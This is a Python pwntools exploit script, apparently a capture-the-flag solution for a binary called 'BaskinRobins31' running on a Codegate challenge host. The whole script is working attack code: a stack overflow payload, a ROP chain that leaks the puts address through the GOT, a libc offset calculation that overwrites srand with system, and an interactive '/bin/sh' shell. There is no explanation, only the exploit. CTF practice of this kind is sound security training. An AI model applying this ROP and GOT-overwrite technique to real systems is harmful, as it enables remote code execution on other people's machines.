from pwn import *

context.arch = "amd64"
# context.log_level = "DEBUG"

e = ELF("./BaskinRobins31")

isRemote = True

if isRemote:
    p = remote("ch41l3ng3s.codegate.kr", 3131)
else:
    p = process("./BaskinRobins31")
    attach(p, "b *0x0000000000400979\nc")

    raw_input("wait..")

p.recvuntil("### The one that take the last match win ###\n")

read_got = 0x0
pppr = next(e.search(asm("pop rdi; pop rsi; pop rdx; ret")))
pr = next(e.search(asm("pop rdi; ret")))

payload = ""

payload += "4\x00" + "A"*0xB6

payload += flat(pppr, 0x0, e.bss(), 0x8, e.plt["read"])
payload += flat(pr, e.got["puts"], e.plt["puts"])
payload += flat(pppr, 0x0, e.got["srand"], 0x8, e.plt["read"])
payload += flat(pr, e.bss(), e.plt["srand"])

p.sendlineafter("? (1-3)\n", payload)

p.recvuntil("rules...:( \n")

p.send("/bin/sh\x00")

recv = p.recv()[:-1]
puts_got = u64(recv + "\x00"*(8-len(recv)))
print("[*] puts_got is " + hex(puts_got))

# libc6_2.23-0ubuntu9_amd64
p.send(p64(puts_got - 0x6f690 + 0x45390))

p.interactive()
